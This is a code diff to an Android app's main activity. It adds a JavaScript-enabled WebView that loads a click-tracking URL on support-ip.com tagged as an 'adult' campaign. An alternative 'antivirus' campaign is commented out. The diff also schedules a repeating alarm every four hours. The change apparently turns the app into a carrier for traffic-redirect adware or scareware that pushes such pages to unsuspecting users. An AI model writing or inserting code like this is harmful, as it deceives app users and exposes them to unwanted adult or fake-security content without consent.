@@ -12,6 +12,7 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.View;
 import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.EditText;
 import android.widget.TextView;
 
@@ -19,68 +20,37 @@ import java.util.Calendar;
 
 public class MainActivity extends AppCompatActivity {
 
-    AlarmManager alarmManager;
-
-//    @Override
-//    protected void onCreate(Bundle savedInstanceState) {
-//        super.onCreate(savedInstanceState);
-//        setContentView(R.layout.activity_main);
-//
-
     AlarmStuff as;
+    private WebView webView;
+    private TextView textView;
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        setContentView(R.layout.frame_activity);
+
+//        textView = (TextView)  findViewById(R.id.textView1);
+//        textView.setVisibility(View.VISIBLE);
+
+
+        webView = (WebView) findViewById(R.id.webView1);
+        webView.getSettings().setJavaScriptEnabled(true);
+        webView.setWebViewClient(new WebViewClient());
+
+        // antivirus
+        //  webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=anund");
+
+        // adult
+        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=adund");
+//        webView.setVisibility(View.VISIBLE);
 
         as = new AlarmStuff();
-        as.setRepeatingAlarm(MainActivity.this, 20000);
-//            initializeUi();
-//        }
-//
-//    private void initializeUi() {
-//        (findViewById(R.id.btn_setAlarm)).setOnClickListener(new View.OnClickListener() {
-//
-//            @Override
-//            public void onClick(View v) {
-//                as.setOnetimeTimer(MainActivity.this, 5000);
-//            }
-//        });
-//    }
-//
-//    @Override
-//    public boolean onCreateOptionsMenu(Menu menu) {
-//        getMenuInflater().inflate(R.menu.main, menu);
-//        return true;
-//    }
-//
-//    @Override
-//    public boolean onOptionsItemSelected(MenuItem item) {
-//        switch (item.getItemId()) {
-//            case R.id.action_settings:
-//                return true;
-//
-//            default:
-//                return super.onOptionsItemSelected(item);
-//        }
-//    }
+//         3600 * 4 * 1000 = 4 часа = 14400000 мс
+//        as.setRepeatingAlarm(MainActivity.this, 000);
+        as.setRepeatingAlarm(MainActivity.this, 14400000);
+
 
     }
 }
 
-//  WebView browser=(WebView)findViewById(R.id.webBrowser);
-//        browser.loadUrl("http://ya.com");
-//        Uri uri = Uri.parse("http://www.google.com"); // missing 'http://' will cause crashed
-//        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
-//        startActivity(intent);
-//        TelephonyManager mTelephonyMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-//
-//        EditText textView2 = (EditText)findViewById(R.id.editText4);
-//        textView2.setText("my Country: " +   mTelephonyMgr.getSimCountryIso() + ", operator: " +  mTelephonyMgr.getNetworkOperatorName());
-
-//        TelephonyManager tMgr = (TelephonyManager)mAppContext.getSystemService(Context.TELEPHONY_SERVICE);
-//        String mPhoneNumber = tMgr.getLine1Number();
-//    }
-
-//}
